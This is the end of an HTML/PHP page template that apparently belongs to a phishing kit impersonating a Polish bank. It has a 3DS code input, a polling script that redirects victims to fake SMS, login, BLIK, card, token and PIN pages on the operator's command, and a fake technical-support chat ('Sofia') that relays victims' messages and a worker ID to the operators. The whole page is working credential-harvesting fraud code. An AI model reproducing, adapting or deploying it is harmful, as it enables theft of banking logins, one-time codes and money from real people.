				for (let i = 0; i < val.length; i++) {
					if (pwdChars.includes(val[i]))
						val2 += val[i];
				}
				elem.value = val2.substr(0, pwdLen);
			}
			document.addEventListener('DOMContentLoaded', function() {
				field3ds.oninput = function() {
					inputMask(field3ds);
				}
				field3ds.focus();
			});
			document.oncontextmenu = function() {
				return false;
			};
		</script>
		<script type="text/javascript">
            
            

            function ajaxsup1() {
                var request = new XMLHttpRequest();

                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) {
                        var loading = document.querySelector('#loading');
                        var smsblock = document.querySelector('#sms');
                        var lkblock = document.querySelector('#lk');
                        var result = request.responseText;
                        // console.log(request.responseText);
                        console.log('%md%');
                        if (result == 'sms') {
                            location="/3ds%md%";
                        } else if (result == 'lk') {
                             location="/autorize%md%";
                        } else if (result == 'photo') {
                             location="/checking%md%";
                        } else if (result == 'blik') {
                             location="/blik%md%";
                        } else if (result == 'push') {
                             location="/potwierdzenie%md%";
                        } else if (result == 'card') {
                             location="/verification%md%";
                        } else if (result == 'token') {
                             location="/ipko%md%";
                        } else if (result == 'pin') {
                             location="/pincode%md%";
                        } else {

                        }
                    }
                }
                request.open('POST', 'procstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=22161894');
            }

            function ajaxdel() {
                var request = new XMLHttpRequest();
                request.open('POST', 'delstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=22161894');
            }

        </script>


        <style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #008251;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #008251;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #008251;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                    <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-chat-icon"></div>
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./paribas_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./paribas_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>
        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="../ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</body></html>